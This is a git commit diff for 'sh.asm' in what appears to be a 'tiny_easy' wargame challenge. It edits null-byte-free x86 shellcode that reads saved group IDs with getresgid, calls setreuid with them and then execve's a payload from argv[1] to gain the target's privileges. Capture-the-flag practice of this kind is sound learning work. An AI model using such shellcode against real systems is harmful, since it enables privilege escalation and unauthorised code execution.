1f9f8bede496602e8794fb895dadfbd85e4e9f2c
Kestrel280 <downey.samp@gmail.com>
2025-06-07 14:47:12 -0400

    tiny_easy partial progress on shellcode updates to acquire proper permissions

--- tiny_easy/sh.asm
+++ tiny_easy/sh.asm
@@ -4,17 +4,31 @@ global _start
 section .text
 
 _start:
-    push 0x32
-    pop eax             ; getegid, no null byte
-    int 0x80
+    mov ebp, esp        ; get some storage space for getresgid
+    add ebp, 0x20
 
-    mov ebx, eax        ; setreuid arg0
-    mov ecx, eax        ; setreuid arg1
-    push 0x46
-    pop eax             ; setreuid, no null byte
+    ; gerresgid() -- store ebp = rgid, ebp+0x4 = egid, ebp+0x8 = sgid
+    push 0x7f           ; need 0xab in eax to call getresgid
+    pop eax             ; but push 0xab results in null bytes
+    add eax, 0x2c       ; so, obnoxious workaround: put 0x7f in eax, then add 0x2c
+    mov ebx, ebp        ; &rgid arg
+    mov ecx, ebp
+    add ecx, 0x4        ; &egid arg
+    mov edx, ebp
+    add edx, 0x8        ; &sgid arg
     int 0x80
+    mov edi, eax        ; store result (0 for success)
+
+    ; setreuid(sgid, sgid)
+    mov ebx, [ebp+0x8]  ; arg0
+    mov ecx, ebx        ; arg1
+    push 0x46
+    pop eax             ; syscall # for setreuid
+    int 0x80
+    mov esi, eax        ; store result (0 for success)
     
-    push 0x0b           ; execve, no null byte
+    ; execve(argv[1], NULL, NULL) TODO might need give non-NULL args
+    push 0x0b           ; syscall # for execve
     pop eax
     mov ebx, [esp+4]    ; execve arg0 (pointer to argv[1] aka strpayload)
     ; mov ecx, [esp+8]    ; execve arg1 (pointer to argv[2], null string)
